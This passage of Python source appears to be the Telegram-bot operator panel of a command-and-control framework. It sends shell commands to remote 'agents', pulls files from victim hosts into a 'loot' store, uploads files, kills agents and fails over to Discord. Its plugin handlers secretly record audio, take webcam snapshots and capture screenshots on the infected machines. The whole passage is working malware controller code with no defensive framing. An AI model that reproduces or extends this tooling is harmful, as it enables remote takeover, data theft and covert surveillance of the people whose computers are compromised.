    async def _enter_shell_mode(self, query, bot, agent_id: str) -> None:
        session = self._sessions.get(agent_id)
        if not session:
            await query.answer("Session not found.", show_alert=True)
            return

        sender_id = query.from_user.id
        self._states[sender_id] = OperatorState(
            mode=InputMode.SHELL_CMD,
            agent_id=agent_id,
        )
        text, kb = build_shell_prompt(session.hostname)
        await _edit(query, text, kb)

    async def _execute_shell(
        self, bot, chat_id: str, sender_id: int, agent_id: str, command: str
    ) -> None:
        self._clear_state(sender_id)
        session = self._sessions.get(agent_id)
        if not session:
            await bot.send_message(chat_id=int(chat_id), text="⚠️ Session lost.")
            return

        await bot.send_message(
            chat_id=int(chat_id),
            text=f"⏳ <code>{_escape(command)}</code>",
            parse_mode="HTML",
        )

        result = await self._c2.dispatch(
            agent_id=agent_id,
            chat_id=session.group_id or chat_id,
            command="shell",
            args={"cmd": command},
        )

        self._audit.plugin_run(self._operator_tag, "exec", agent_id, {"cmd": command}, result.get("status","?"))
        session.touch(f"shell:{command[:30]}", result.get("status","?"))

        output = result.get("output", "") or f"[{result.get('status')}]"
        header = f"<code>{_escape(command)}</code>\n─────────────────────\n"

        for chunk in _chunk_text(header + _escape(output), 4096):
            await bot.send_message(
                chat_id=int(chat_id), text=chunk, parse_mode="HTML"
            )

        # restore agent menu
        text, kb = build_agent_menu(session)
        await bot.send_message(
            chat_id=int(chat_id), text=text,
            parse_mode="HTML", reply_markup=kb,
        )

    # ── download mode ─────────────────────────────────────────────────────
    async def _enter_download_mode(self, query, bot, agent_id: str) -> None:
        session = self._sessions.get(agent_id)
        if not session:
            await query.answer("Session not found.", show_alert=True)
            return
        sender_id = query.from_user.id
        self._states[sender_id] = OperatorState(
            mode=InputMode.DOWNLOAD_PATH, agent_id=agent_id
        )
        text, kb = build_download_prompt(session.hostname)
        await _edit(query, text, kb)

    async def _execute_download(
        self, bot, chat_id: str, sender_id: int, agent_id: str, remote_path: str
    ) -> None:
        self._clear_state(sender_id)
        session = self._sessions.get(agent_id)
        if not session:
            return

        await bot.send_message(
            chat_id=int(chat_id),
            text=f"⏳ Downloading <code>{_escape(remote_path)}</code>...",
            parse_mode="HTML",
        )

        result = await self._c2.dispatch(
            agent_id=agent_id,
            chat_id=session.group_id or chat_id,
            command="download",
            args={"path": remote_path},
        )

        if result.get("status") == "ok":
            filename = _osp.basename(remote_path.replace("\\", "/"))
            output   = result.get("output", "")
            raw: bytes = b""
            # The download command returns a JSON dict with 'data' (base64) or
            # raw base64 string directly from the agent.
            if output:
                try:
                    import json as _json
                    parsed = _json.loads(output)
                    b64 = parsed.get("data", "")
                    raw = _base64.b64decode(b64) if b64 else b""
                except Exception:
                    # output is raw base64
                    try:
                        raw = _base64.b64decode(output.strip())
                    except Exception:
                        raw = b""
            if raw:
                loot_id = self._loot.add(agent_id, "file", filename, raw)
                await bot.send_document(
                    chat_id=int(chat_id),
                    document=_io.BytesIO(raw),
                    filename=filename,
                    caption=f"📁 {filename}  (loot #{loot_id})",
                )
            else:
                await bot.send_message(
                    chat_id=int(chat_id),
                    text=f"⚠️ Download returned empty data for <code>{_escape(remote_path)}</code>",
                    parse_mode="HTML",
                )
        else:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"❌ Download failed: {result.get('output','unknown error')}",
                parse_mode="HTML",
            )

        text, kb = build_agent_menu(session)
        await bot.send_message(
            chat_id=int(chat_id), text=text,
            parse_mode="HTML", reply_markup=kb,
        )

    # ── history ───────────────────────────────────────────────────────────
    async def _show_history(self, query, agent_id: str) -> None:
        session = self._sessions.get(agent_id)
        if not session:
            await query.answer("Session not found.", show_alert=True)
            return
        entries = session.history(20)
        text    = build_history_text(session, entries)
        kb      = _kb(
            [_btn("🔄 Refresh",  f"history:{agent_id}")],
            _back(f"agent:{agent_id}"),
        )
        await _edit(query, text, kb)

    # ── loot items ────────────────────────────────────────────────────────
    async def _show_loot_items(self, query, kind: str) -> None:
        if kind == "all":
            rows = self._loot.search(limit=20)
        elif kind == "export":
            await query.answer("Use CLI: loot --export", show_alert=True)
            return
        else:
            rows = self._loot.search(kind=kind, limit=20)

        if not rows:
            text = f"<b>Loot — {kind}</b>\n\nNo entries."
        else:
            lines = [f"<b>Loot — {kind}</b>\n─────────────────────"]
            for r in rows:
                ts = time.strftime("%H:%M", time.localtime(r["ts"]))
                lines.append(f"#{r['id']}  {ts}  {r['agent_id'][:8]}  {r['label']}")
            text = "\n".join(lines)

        kb = _kb(_back("loot"))
        for chunk in _chunk_text(text, 4096):
            await _edit(query, chunk, kb)

    # ── kill ──────────────────────────────────────────────────────────────
    async def _execute_kill(self, query, bot, agent_id: str) -> None:
        session = self._sessions.get(agent_id)
        if not session:
            await _edit(query, "⚠️ Session already gone.", _kb(_back("sessions")))
            return

        result = await self._c2.dispatch(
            agent_id=agent_id,
            chat_id=session.group_id or str(self._operator_id),
            command="die",
            args={},
        )

        self._sessions.remove(agent_id)
        self._audit.session_event("killed", agent_id)
        session.touch("die", result.get("status", "sent"))

        await _edit(
            query,
            f"💀 Agent <code>{agent_id}</code> killed.",
            _kb(_back("sessions")),
        )

    # ── listener control ──────────────────────────────────────────────────
    async def _control_listener(self, query, transport: str) -> None:
        if transport == "discord":
            ok = await self._router.force_failover("discord")
            msg = "⚡ Switched to Discord." if ok else "⚠️ Discord not available."
        elif transport == "telegram":
            ok = await self._router.force_recover()
            msg = "✅ Recovered to Telegram." if ok else "⚠️ Telegram not available."
        else:
            msg = "⚠️ Unknown transport."

        await query.answer(msg, show_alert=True)
        text, kb = build_listeners_menu(self._router.status_table())
        await _edit(query, text, kb)

    # ── new command handlers ──────────────────────────────────────────────

    async def _run_audio(self, bot, chat_id: str, agent_id: str, seconds: int) -> None:
        """Run audio_capture plugin and send result as voice/document."""
        session = self._sessions.get(agent_id)
        if not session:
            await bot.send_message(chat_id=int(chat_id), text="Agent not found.")
            return
        await bot.send_message(
            chat_id=int(chat_id),
            text=f"⏳ Recording audio for {seconds}s on <b>{session.hostname}</b>...",
            parse_mode="HTML",
        )
        if not self._on_plugin_run:
            await bot.send_message(chat_id=int(chat_id), text="Plugin runner not configured.")
            return
        mr = await self._on_plugin_run(agent_id, "audio_capture", {"duration_sec": seconds})
        if mr.status.value == "error":
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Audio capture failed: {mr.error}",
            )
            return
        output = mr.data if isinstance(mr.data, str) else str(mr.data)
        # Extract file path from output
        wav_path = None
        for line in output.splitlines():
            if "Audio saved:" in line:
                wav_path = line.split("Audio saved:")[-1].strip()
                break
        if wav_path:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Audio recorded: <code>{wav_path}</code>",
                parse_mode="HTML",
            )
        else:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Audio capture result:\n<pre>{_escape(output[:1000])}</pre>",
                parse_mode="HTML",
            )

    async def _run_webcam(self, bot, chat_id: str, agent_id: str) -> None:
        """Run webcam_snap plugin and send result as photo."""
        session = self._sessions.get(agent_id)
        if not session:
            await bot.send_message(chat_id=int(chat_id), text="Agent not found.")
            return
        await bot.send_message(
            chat_id=int(chat_id),
            text=f"📷 Snapping webcam on <b>{session.hostname}</b>...",
            parse_mode="HTML",
        )
        if not self._on_plugin_run:
            await bot.send_message(chat_id=int(chat_id), text="Plugin runner not configured.")
            return
        mr = await self._on_plugin_run(agent_id, "webcam_snap", {"frame_count": 1})
        if mr.status.value == "error":
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Webcam snap failed: {mr.error}",
            )
            return
        output = mr.data if isinstance(mr.data, str) else str(mr.data)
        # Extract file path(s)
        jpg_paths = []
        for line in output.splitlines():
            if "Frame" in line and ("jpg" in line.lower() or "bmp" in line.lower()):
                path_part = line.split(":")[-1].strip()
                if path_part:
                    jpg_paths.append(path_part)
        if jpg_paths:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Webcam frames: {', '.join(f'<code>{p}</code>' for p in jpg_paths)}",
                parse_mode="HTML",
            )
        else:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Webcam result:\n<pre>{_escape(output[:1000])}</pre>",
                parse_mode="HTML",
            )

    async def _run_screenshot_cmd(self, bot, chat_id: str, agent_id: str) -> None:
        """Run screenshot plugin via /screenshot command."""
        session = self._sessions.get(agent_id)
        if not session:
            await bot.send_message(chat_id=int(chat_id), text="Agent not found.")
            return
        await bot.send_message(
            chat_id=int(chat_id),
            text=f"📸 Capturing screenshot from <b>{session.hostname}</b>...",
            parse_mode="HTML",
        )
        if not self._on_plugin_run:
            await bot.send_message(chat_id=int(chat_id), text="Plugin runner not configured.")
            return
        mr = await self._on_plugin_run(agent_id, "screenshot", {})
        if mr.status.value == "error":
            await bot.send_message(chat_id=int(chat_id), text=f"Screenshot failed: {mr.error}")
            return
        if isinstance(mr.data, bytes) and len(mr.data) > 0:
            try:
                await bot.send_photo(
                    chat_id=int(chat_id),
                    photo=mr.data,
                    caption=f"📸 {session.hostname}",
                )
            except Exception as exc:
                await bot.send_message(
                    chat_id=int(chat_id),
                    text=f"Screenshot captured but send failed: {exc}",
                )
        else:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Screenshot result: {str(mr.data)[:200]}",
            )

    async def _show_plugins_list(self, bot, chat_id: str, category: str = "") -> None:
        """Send list of available plugins as formatted text."""
        if self._list_plugins:
            entries = self._list_plugins(category)
        else:
            entries = []

        if not entries:
            await bot.send_message(
                chat_id=int(chat_id),
                text=(
                    "Use the <b>plugins</b> command in the CLI console for the full plugin list.\n"
                    "Or tap a menu category (Recon, Creds, etc.) in the inline keyboard."
                ),
                parse_mode="HTML",
            )
            return

        header = f"<b>Plugins{' [' + category + ']' if category else ''}</b> ({len(entries)})\n"
        header += "─────────────────────\n"
        lines  = [header]
        for p in entries:
            mitre = f"  <code>{p['mitre']}</code>" if p.get("mitre") else ""
            lines.append(f"<b>{p['name']}</b>  [{p['category']}]{mitre}\n  {p['description'][:60]}\n")

        for chunk in _chunk_text("\n".join(lines), 4096):
            await bot.send_message(
                chat_id=int(chat_id), text=chunk, parse_mode="HTML"
            )

    async def _do_upload_to_agent(
        self, bot, chat_id: str, sender_id: int,
        agent_id: str, staged_path: str, remote_path: str
    ) -> None:
        """Actually push the staged file to the agent."""
        self._clear_state(sender_id)
        session = self._sessions.get(agent_id)
        if not session:
            await bot.send_message(chat_id=int(chat_id), text="Agent not found.")
            return

        import base64 as _b64
        try:
            data_b64 = _b64.b64encode(Path(staged_path).read_bytes()).decode()
        except Exception as exc:
            await bot.send_message(chat_id=int(chat_id), text=f"Failed to read staged file: {exc}")
            return

        await bot.send_message(
            chat_id=int(chat_id),
            text=f"⬆ Uploading to <b>{session.hostname}</b>:<code>{remote_path}</code>...",
            parse_mode="HTML",
        )

        result = await self._c2.dispatch(
            agent_id=agent_id,
            chat_id=session.group_id or chat_id,
            command="upload",
            args={"path": remote_path, "data": data_b64},
        )

        if result.get("status") == "ok":
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Upload complete: <code>{remote_path}</code>",
                parse_mode="HTML",
            )
        else:
            await bot.send_message(
                chat_id=int(chat_id),
                text=f"Upload failed: {result.get('output', 'unknown error')}",
            )

        # Clean up staged file
        try:
            Path(staged_path).unlink(missing_ok=True)
        except Exception as exc:
            log.debug("[telegram_ui] failed to clean up staged file %s: %s", staged_path, exc)

    # ── state helpers ─────────────────────────────────────────────────────
    def _clear_state(self, sender_id: int) -> None:
        self._states.pop(sender_id, None)

    def get_state(self, sender_id: int) -> OperatorState:
        return self._states.get(sender_id, OperatorState())


# ── Utility helpers ───────────────────────────────────────────────────────────

async def _answer(query, text: str = "", show_alert: bool = False) -> None:
    """Answer callback query with optional alert."""
    try:
        await query.answer(text=text, show_alert=show_alert)
    except TelegramError:
        pass


async def _edit(query, text: str, kb: InlineKeyboardMarkup) -> None:
    """Edit the current inline message in-place."""
    try:
        await query.edit_message_text(
            text=text, parse_mode="HTML", reply_markup=kb
        )
    except TelegramError as exc:
        # "Message is not modified" is benign — ignore it
        if "not modified" not in str(exc).lower():
            raise


def _chunk_text(text: str, size: int) -> list[str]:
    return [text[i: i + size] for i in range(0, max(len(text), 1), size)]


def _escape(text: str) -> str:
    """Escape HTML special characters for parse_mode=HTML."""
    return (
        text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    )
